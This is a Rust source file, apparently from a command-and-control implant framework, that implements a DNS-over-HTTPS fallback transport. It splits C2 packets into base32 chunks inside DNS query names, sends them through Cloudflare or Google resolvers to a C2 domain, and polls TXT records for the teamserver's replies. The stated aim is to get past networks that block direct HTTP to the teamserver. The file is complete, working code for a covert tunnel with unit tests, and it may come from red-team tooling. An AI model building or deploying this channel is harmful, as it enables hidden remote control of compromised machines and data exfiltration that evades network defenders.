//! DNS-over-HTTPS fallback transport for environments that block direct
//! HTTP/HTTPS to the C2 teamserver.
//!
//! # Protocol overview
//!
//! C2 packets are encoded as base32 chunks embedded in DNS query names.
//! A public DoH resolver (Cloudflare or Google) forwards the queries to the
//! authoritative DNS server for the configured C2 domain, which acts as the
//! actual teamserver-side handler.
//!
//! ## Wire format — uplink (agent → teamserver)
//!
//! One TXT query per chunk:
//! ```text
//! <base32_chunk>.<seq:04x><total:04x>.<session_hex16>.u.<c2_domain>
//! ```
//! - `base32_chunk` — up to [`CHUNK_B32_LEN`] base32 chars (RFC 4648 lowercase)
//! - `seq` — 0-based chunk sequence number (4 hex chars)
//! - `total` — total number of chunks (4 hex chars)
//! - `session_hex16` — 16 lowercase hex chars (8 random bytes)
//! - `u` — direction sentinel for uplink
//!
//! ## Wire format — downlink (teamserver → agent)
//!
//! **Ready poll:** `rdy.<session_hex16>.d.<c2_domain>`
//! - Returns NXDOMAIN while the server is still processing.
//! - Returns a TXT record `<total_hex:04x>` once the response is ready.
//!
//! **Chunk fetch:** `<seq:04x>.<session_hex16>.d.<c2_domain>`
//! - Returns TXT record with base32-encoded chunk data.
//!
//! The teamserver-side DNS listener is responsible for reassembling uplink
//! chunks, processing the C2 packet, and publishing downlink TXT records
//! (see issue `red-cell-c2-XXXX` for the teamserver DNS handler).

use std::time::Duration;

use tracing::{debug, trace};

use crate::error::SpecterError;

/// Maximum base32 characters per DNS data label.
///
/// DNS labels are limited to 63 octets. We use 60 to leave room for encoding
/// overhead.  60 base32 chars decode to `floor(60 * 5 / 8)` = 37 bytes.
const CHUNK_B32_LEN: usize = 60;

/// Bytes encoded per chunk: `floor(CHUNK_B32_LEN * 5 / 8)`.
const CHUNK_BYTES: usize = CHUNK_B32_LEN * 5 / 8; // 37

/// Maximum number of chunks a single request may span (approx. 36 KiB).
const MAX_CHUNKS: usize = 1000;

/// DoH JSON API DNS query type for TXT records.
const DNS_TYPE_TXT: u32 = 16;

/// DoH provider selection.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum DohProvider {
    /// Cloudflare `1.1.1.1` — `https://cloudflare-dns.com/dns-query`
    #[default]
    Cloudflare,
    /// Google `8.8.8.8` — `https://dns.google/dns-query`
    Google,
}

impl DohProvider {
    /// Return the HTTPS URL for the DoH JSON API endpoint.
    pub fn url(self) -> &'static str {
        match self {
            DohProvider::Cloudflare => "https://cloudflare-dns.com/dns-query",
            DohProvider::Google => "https://dns.google/dns-query",
        }
    }
}

/// DoH transport: encodes C2 packets as DNS queries sent via a public
/// DoH resolver to the authoritative C2 domain.
#[derive(Debug)]
pub struct DohTransport {
    client: reqwest::Client,
    provider_url: &'static str,
    /// Authoritative domain for C2 DNS (e.g. `"c2.example.com"`).
    c2_domain: String,
}

impl DohTransport {
    /// Create a new `DohTransport`.
    ///
    /// `c2_domain` is the authoritative zone handled by the teamserver's DNS
    /// listener (e.g. `"c2.example.com"`).
    pub fn new(c2_domain: String, provider: DohProvider) -> Result<Self, SpecterError> {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(10))
            .build()
            .map_err(|e| SpecterError::Transport(format!("DoH client build failed: {e}")))?;

        Ok(Self { client, provider_url: provider.url(), c2_domain })
    }

    /// Send `packet` bytes to the teamserver via DoH and return the response.
    pub async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, SpecterError> {
        let session = generate_session_hex();

        // --- uplink ---
        let chunks = encode_chunks(packet);
        let total = chunks.len();

        if total > MAX_CHUNKS {
            return Err(SpecterError::Transport(format!(
                "DoH: packet too large ({} bytes, {total} chunks > {MAX_CHUNKS})",
                packet.len()
            )));
        }

        debug!(
            session = %session,
            total_chunks = total,
            packet_len = packet.len(),
            "DoH uplink: sending {total} chunks"
        );

        for (seq, chunk) in chunks.iter().enumerate() {
            let name = format!("{}.{seq:04x}{total:04x}.{session}.u.{}", chunk, self.c2_domain);
            trace!(seq, name = %name, "DoH uplink chunk");
            // Fire-and-forget: the server reads the name; we don't need the answer.
            // Errors here are non-fatal (the query still reached the authoritative
            // server even if the DoH resolver returns NXDOMAIN).
            let _ = self.txt_query(&name).await;
        }

        // --- downlink ---
        let response = self.receive_response(&session).await?;

        debug!(
            session = %session,
            response_len = response.len(),
            "DoH downlink: received {}-byte response",
            response.len()
        );

        Ok(response)
    }

    /// Poll the ready probe and then fetch all response chunks.
    async fn receive_response(&self, session: &str) -> Result<Vec<u8>, SpecterError> {
        // Poll `rdy.<session>.d.<c2_domain>` until the server is ready.
        let total = self.poll_ready(session).await?;

        // Fetch each chunk in order.
        let mut assembled: Vec<Vec<u8>> = Vec::with_capacity(total);
        for seq in 0..total {
            let name = format!("{seq:04x}.{session}.d.{}", self.c2_domain);
            trace!(seq, name = %name, "DoH downlink chunk query");

            let records = self.txt_query(&name).await?;
            let b32 = records.into_iter().next().ok_or_else(|| {
                SpecterError::Transport(format!("DoH: no TXT record for chunk {seq}"))
            })?;

            let data = decode_b32(b32.trim_matches('"').trim()).map_err(|e| {
                SpecterError::Transport(format!("DoH: base32 decode error for chunk {seq}: {e}"))
            })?;

            assembled.push(data);
        }

        Ok(assembled.into_iter().flatten().collect())
    }

    /// Poll `rdy.<session>.d.<c2_domain>` with exponential backoff until the
    /// server publishes the total downlink chunk count.
    async fn poll_ready(&self, session: &str) -> Result<usize, SpecterError> {
        let name = format!("rdy.{session}.d.{}", self.c2_domain);
        let mut delay = Duration::from_millis(500);
        const MAX_DELAY: Duration = Duration::from_secs(8);
        const MAX_ATTEMPTS: u32 = 20;

        for attempt in 0..MAX_ATTEMPTS {
            trace!(attempt, name = %name, "DoH ready poll");
            match self.txt_query(&name).await {
                Ok(records) => {
                    if let Some(txt) = records.into_iter().next() {
                        let s = txt.trim_matches('"').trim();
                        let total = usize::from_str_radix(s, 16).map_err(|_| {
                            SpecterError::Transport(format!("DoH: invalid ready TXT value {s:?}"))
                        })?;
                        debug!(total, "DoH ready: server has {total} response chunks");
                        return Ok(total);
                    }
                }
                Err(e) => {
                    // NXDOMAIN or transient error — server not ready yet.
                    trace!("DoH ready poll attempt {attempt}: {e}");
                }
            }

            tokio::time::sleep(delay).await;
            delay = (delay * 2).min(MAX_DELAY);
        }

        Err(SpecterError::Transport(format!(
            "DoH: timed out waiting for response (session {session})"
        )))
    }

    /// Query `name` for TXT records via the DoH JSON API.
    ///
    /// Returns the list of TXT record data strings on success.
    async fn txt_query(&self, name: &str) -> Result<Vec<String>, SpecterError> {
        let response = self
            .client
            .get(self.provider_url)
            .query(&[("name", name), ("type", "TXT")])
            .header("Accept", "application/dns-json")
            .send()
            .await
            .map_err(|e| SpecterError::Transport(format!("DoH HTTP error: {e}")))?;

        if !response.status().is_success() {
            return Err(SpecterError::Transport(format!(
                "DoH returned HTTP {}",
                response.status()
            )));
        }

        let body = response
            .text()
            .await
            .map_err(|e| SpecterError::Transport(format!("DoH response read error: {e}")))?;

        parse_doh_txt_records(&body).map_err(SpecterError::Transport)
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Encoding helpers
// ──────────────────────────────────────────────────────────────────────────────

/// RFC 4648 base32 alphabet (lowercase).
const B32_ALPHABET: &[u8; 32] = b"abcdefghijklmnopqrstuvwxyz234567";

/// Encode `data` as lowercase base32 without padding.
pub fn encode_b32(data: &[u8]) -> String {
    if data.is_empty() {
        return String::new();
    }

    let out_len = (data.len() * 8).div_ceil(5);
    let mut out = Vec::with_capacity(out_len);

    let mut buf: u64 = 0;
    let mut bits: u32 = 0;

    for &byte in data {
        buf = (buf << 8) | u64::from(byte);
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            out.push(B32_ALPHABET[((buf >> bits) & 0x1F) as usize]);
        }
    }
    if bits > 0 {
        out.push(B32_ALPHABET[((buf << (5 - bits)) & 0x1F) as usize]);
    }

    // Safety: B32_ALPHABET is all ASCII.
    String::from_utf8(out).unwrap_or_default()
}

/// Decode lowercase base32 (no padding) into bytes.
///
/// Returns an error string on invalid input.
pub fn decode_b32(s: &str) -> Result<Vec<u8>, String> {
    let mut buf: u64 = 0;
    let mut bits: u32 = 0;
    let mut out = Vec::with_capacity(s.len() * 5 / 8);

    for (i, ch) in s.chars().enumerate() {
        let val = match ch {
            'a'..='z' => (ch as u8 - b'a') as u64,
            '2'..='7' => (ch as u8 - b'2' + 26) as u64,
            _ => return Err(format!("invalid base32 char {ch:?} at position {i}")),
        };
        buf = (buf << 5) | val;
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }

    Ok(out)
}

/// Split `packet` into base32-encoded chunks of at most [`CHUNK_B32_LEN`] chars.
fn encode_chunks(packet: &[u8]) -> Vec<String> {
    packet.chunks(CHUNK_BYTES).map(encode_b32).collect()
}

/// Generate a 16-char lowercase hex session identifier (8 random bytes).
fn generate_session_hex() -> String {
    let bytes: [u8; 8] = rand::random();
    bytes.iter().fold(String::with_capacity(16), |mut s, b| {
        use std::fmt::Write as _;
        let _ = write!(s, "{b:02x}");
        s
    })
}

// ──────────────────────────────────────────────────────────────────────────────
// Minimal DoH JSON response parser
// ──────────────────────────────────────────────────────────────────────────────

/// Parse TXT record data strings from a DoH JSON API response body.
///
/// Returns `Err` for NXDOMAIN (`Status != 0`) or JSON parse failures.
/// Returns an empty `Vec` when the answer section is absent.
fn parse_doh_txt_records(body: &str) -> Result<Vec<String>, String> {
    // Status field — NXDOMAIN = 3.
    let status = json_u64_field(body, "Status")
        .ok_or_else(|| format!("DoH: missing 'Status' field in response: {body}"))?;

    if status != 0 {
        return Err(format!("DoH: DNS status {status} (NXDOMAIN or error)"));
    }

    // Extract the Answer array's "data" fields where "type" == 16 (TXT).
    let records = extract_answer_data(body, DNS_TYPE_TXT);
    Ok(records)
}

/// Very small JSON field extractor — finds `"<key>": <u64>` without pulling in
/// a full JSON crate at runtime.
fn json_u64_field(s: &str, key: &str) -> Option<u64> {
    let needle = format!("\"{key}\"");
    let start = s.find(needle.as_str())?;
    let rest = &s[start + needle.len()..];
    // Skip whitespace and the colon.
    let rest = rest.trim_start().strip_prefix(':')?;
    let rest = rest.trim_start();
    let end = rest.find(|c: char| !c.is_ascii_digit()).unwrap_or(rest.len());
    rest[..end].parse().ok()
}

/// Extract all TXT `data` string values from the DoH JSON `Answer` array.
///
/// This is a deliberately minimal parser: it finds each `"type": 16` record
/// and returns the corresponding `"data"` field as a raw string.
fn extract_answer_data(body: &str, record_type: u32) -> Vec<String> {
    let type_needle = format!("\"type\":{record_type}");
    let type_needle_sp = format!("\"type\": {record_type}");
    let mut results = Vec::new();
    let mut search = body;

    while let Some(pos) =
        search.find(type_needle.as_str()).or_else(|| search.find(type_needle_sp.as_str()))
    {
        // Look for "data": "..." within roughly the same JSON object.
        let window = &search[pos..];
        let end = window.find('}').unwrap_or(window.len());
        let obj = &window[..end];

        if let Some(data_str) = extract_json_string(obj, "data") {
            // Cloudflare DoH JSON wraps TXT strings in escaped double-quotes:
            // the raw JSON value is "\"text\"", so after string extraction we
            // have the literal string `\"text\"`.  Unescape then strip the
            // surrounding TXT double-quotes to give the bare record text.
            let unescaped = data_str.replace("\\\"", "\"");
            results.push(unescaped.trim_matches('"').to_string());
        }

        // Advance past this match.
        let advance = pos + type_needle.len().max(type_needle_sp.len());
        if advance >= search.len() {
            break;
        }
        search = &search[advance..];
    }

    results
}

/// Extract a JSON string field `"<key>": "value"` from a small JSON fragment.
fn extract_json_string(fragment: &str, key: &str) -> Option<String> {
    let needle = format!("\"{key}\"");
    let start = fragment.find(needle.as_str())?;
    let rest = &fragment[start + needle.len()..];
    let rest = rest.trim_start().strip_prefix(':')?.trim_start();
    if let Some(inner) = rest.strip_prefix('"') {
        // Find the closing quote, handling escaped quotes.
        let mut escaped = false;
        let mut end = None;
        for (i, ch) in inner.char_indices() {
            if escaped {
                escaped = false;
            } else if ch == '\\' {
                escaped = true;
            } else if ch == '"' {
                end = Some(i);
                break;
            }
        }
        end.map(|e| inner[..e].to_string())
    } else {
        None
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Tests
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── base32 round-trip ──────────────────────────────────────────────────

    #[test]
    fn base32_round_trip_empty() {
        assert_eq!(decode_b32(&encode_b32(&[])).unwrap(), Vec::<u8>::new());
    }

    #[test]
    fn base32_round_trip_one_byte() {
        let data = vec![0xFFu8];
        assert_eq!(decode_b32(&encode_b32(&data)).unwrap(), data);
    }

    #[test]
    fn base32_round_trip_five_bytes() {
        // 5 bytes → exactly 8 base32 chars (no remainder).
        let data = vec![0xDE, 0xAD, 0xBE, 0xEF, 0x42];
        let encoded = encode_b32(&data);
        assert_eq!(encoded.len(), 8);
        assert_eq!(decode_b32(&encoded).unwrap(), data);
    }

    #[test]
    fn base32_round_trip_varied_lengths() {
        for len in 1usize..=40 {
            let data: Vec<u8> = (0..len).map(|i| (i * 7 + 13) as u8).collect();
            let encoded = encode_b32(&data);
            let decoded = decode_b32(&encoded).expect("decode failed");
            assert_eq!(decoded, data, "round-trip failed at len={len}");
        }
    }

    #[test]
    fn base32_output_is_lowercase_and_dns_safe() {
        let data: Vec<u8> = (0..=255).collect();
        let encoded = encode_b32(&data);
        for ch in encoded.chars() {
            assert!(
                ch.is_ascii_lowercase() || ch.is_ascii_digit(),
                "non-DNS-safe char {ch:?} in base32 output"
            );
        }
    }

    #[test]
    fn base32_decode_rejects_invalid_char() {
        let result = decode_b32("abcde+fg");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains('+'));
    }

    // ── chunk encoding ─────────────────────────────────────────────────────

    #[test]
    fn encode_chunks_empty_packet_yields_no_chunks() {
        // An empty slice produces no chunks — callers must handle the zero-chunk case.
        let chunks = encode_chunks(&[]);
        assert_eq!(chunks.len(), 0);
    }

    #[test]
    fn encode_chunks_small_packet_is_one_chunk() {
        let data = vec![1u8; 10];
        let chunks = encode_chunks(&data);
        assert_eq!(chunks.len(), 1);
    }

    #[test]
    fn encode_chunks_exactly_one_chunk_boundary() {
        let data = vec![0xABu8; CHUNK_BYTES];
        let chunks = encode_chunks(&data);
        assert_eq!(chunks.len(), 1);
        assert_eq!(chunks[0].len(), CHUNK_B32_LEN);
    }

    #[test]
    fn encode_chunks_spans_multiple_chunks() {
        let data = vec![0x55u8; CHUNK_BYTES * 3 + 1];
        let chunks = encode_chunks(&data);
        assert_eq!(chunks.len(), 4);
    }

    #[test]
    fn encode_chunks_all_labels_fit_in_dns_label() {
        let data: Vec<u8> = (0..200).map(|i| i as u8).collect();
        for chunk in encode_chunks(&data) {
            assert!(chunk.len() <= 63, "chunk label too long: {} chars", chunk.len());
        }
    }

    // ── session hex ────────────────────────────────────────────────────────

    #[test]
    fn session_hex_is_16_lowercase_hex_chars() {
        let session = generate_session_hex();
        assert_eq!(session.len(), 16);
        for ch in session.chars() {
            assert!(
                ch.is_ascii_hexdigit() && !ch.is_uppercase(),
                "non-lowercase-hex char {ch:?} in session id"
            );
        }
    }

    #[test]
    fn session_hex_is_random() {
        let a = generate_session_hex();
        let b = generate_session_hex();
        // Astronomically unlikely to collide.
        assert_ne!(a, b);
    }

    // ── DoH JSON parsing ───────────────────────────────────────────────────

    #[test]
    fn parse_doh_txt_records_nxdomain() {
        let body = r#"{"Status":3,"TC":false,"RD":true,"RA":true,"AD":false}"#;
        let err = parse_doh_txt_records(body).unwrap_err();
        assert!(err.contains('3'), "error should mention status 3, got: {err}");
    }

    #[test]
    fn parse_doh_txt_records_noerror_no_answer() {
        let body = r#"{"Status":0,"TC":false}"#;
        let records = parse_doh_txt_records(body).unwrap();
        assert!(records.is_empty());
    }

    #[test]
    fn parse_doh_txt_records_single_answer() {
        let body = r#"{
            "Status": 0,
            "Answer": [
                {"name":"rdy.abc.d.c2.test.","type":16,"TTL":1,"data":"\"0003\""}
            ]
        }"#;
        let records = parse_doh_txt_records(body).unwrap();
        assert_eq!(records, vec!["0003".to_string()]);
    }

    #[test]
    fn parse_doh_txt_records_filters_non_txt() {
        let body = r#"{
            "Status": 0,
            "Answer": [
                {"name":"example.","type":1,"TTL":60,"data":"1.2.3.4"},
                {"name":"example.","type":16,"TTL":1,"data":"\"hello\""}
            ]
        }"#;
        let records = parse_doh_txt_records(body).unwrap();
        assert_eq!(records, vec!["hello".to_string()]);
    }

    #[test]
    fn parse_doh_txt_records_missing_status_is_error() {
        let body = r#"{"TC":false}"#;
        let err = parse_doh_txt_records(body).unwrap_err();
        assert!(err.contains("Status"));
    }

    #[test]
    fn json_u64_field_basic() {
        let s = r#"{"Status": 0, "TC": false}"#;
        assert_eq!(json_u64_field(s, "Status"), Some(0));
    }

    #[test]
    fn json_u64_field_non_zero() {
        let s = r#"{"Status":3}"#;
        assert_eq!(json_u64_field(s, "Status"), Some(3));
    }

    #[test]
    fn json_u64_field_absent() {
        let s = r#"{"TC":false}"#;
        assert_eq!(json_u64_field(s, "Status"), None);
    }

    // ── DohProvider ───────────────────────────────────────────────────────

    #[test]
    fn doh_provider_urls_are_https() {
        for provider in [DohProvider::Cloudflare, DohProvider::Google] {
            assert!(
                provider.url().starts_with("https://"),
                "DoH provider URL must be HTTPS: {}",
                provider.url()
            );
        }
    }

    #[test]
    fn doh_provider_default_is_cloudflare() {
        assert_eq!(DohProvider::default(), DohProvider::Cloudflare);
    }

    // ── DohTransport construction ─────────────────────────────────────────

    #[test]
    fn doh_transport_constructs_successfully() {
        let t = DohTransport::new("c2.example.com".to_string(), DohProvider::Cloudflare);
        assert!(t.is_ok());
    }
}
